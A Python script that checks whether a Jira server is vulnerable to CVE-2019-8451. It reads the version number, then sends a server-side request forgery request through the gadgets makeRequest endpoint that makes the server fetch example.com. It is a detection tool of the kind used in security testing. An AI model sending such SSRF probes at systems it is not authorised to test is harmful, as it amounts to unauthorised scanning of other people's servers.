#!/usr/bin/env python3
import argparse
import requests
import re

G, B, R, W, M, C, end = '\033[92m', '\033[94m', '\033[91m', '\x1b[37m', '\x1b[35m', '\x1b[36m', '\033[0m'
info = end + W + "[-]" + W
good = end + G + "[+]" + C
bad = end + R + "[" + W + "!" + R + "]"

user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"

def check_version(url):
	target = url
	response = send_request(target)

	print(info + " Checking for version..." + end)

	r1 = re.search('[0-9]{1}\.[0-9]{1}\.[0-9]{1}', str(response))
	print(info + " Jira version appears to be: " + r1.group(0) + end)

	v1 = '8.4.0'
	v2 = r1.group(0)

	if comapre_versions(v1, v2) == False:
		print(bad + " Version seems to indicate it's probably not vulnerable." + end)
	else:
		print(good + " Version seems to indicate it might be vulnerable!" + end)
	
def comapre_versions(v1, v2):
    for i, j in zip(map(int, v1.split(".")), map(int, v2.split("."))):
        if i == j:
            continue
        return i > j
    return len(v1.split(".")) > len(v2.split("."))

def check_vuln(url):
	target = url + "/plugins/servlet/gadgets/makeRequest?url=" + url + "@example.com/"
	response = send_request(target)

	print(info + " Sending SSRF test..." + end)

	if '"rc":200' in response and "Example Domain" in response:
		print(good + " Host appears to be vulnerable! " + end)
	else:
		print(bad + " Host doesn't appear to be vulnerable." + end)

def send_request(target):
	headers = {'X-Atlassian-token':'no-check', 'User-Agent':user_agent}
	try:
		r = requests.get(target, headers=headers)
	except Exception as e:
		print(bad + " Problem with request! " + end)
		print(e)
		exit(-1)

	if (r.status_code != 200):
		print(info + " Something went wrong! " + end)
		if (r.status_code == 302):
			print(bad + " Redirected. Try this instead: " + r.headers['Location'] + end)
		else:
			print(bad + " Status: " + str(r.status_code) + end)
		exit(-1)

	return(r.text)

if __name__ == '__main__':
	parser = argparse.ArgumentParser(prog='jira-2019-8451.py', description='For checking if a Jira instance is vunlerable to CVE-2019-8451')
	parser.add_argument("-u", "--url", help="URL of the target Jira instance e.g. '-u https://localhost:8080'")
	parser.add_argument("-c", "--check", help="Only check the Jira version; doesn't send SSRF attempt", action='store_true')
	args = parser.parse_args()

	if not args.url:
		print(bad + " Missing parameters " + end)
		parser.print_help()
		exit(-1)

	url = str(args.url)

	print(info + " Testing " + url + "..." + end)

	if args.check == True:
		check_version(url)
		exit(0)
	else:
		check_version(url)
		check_vuln(url)
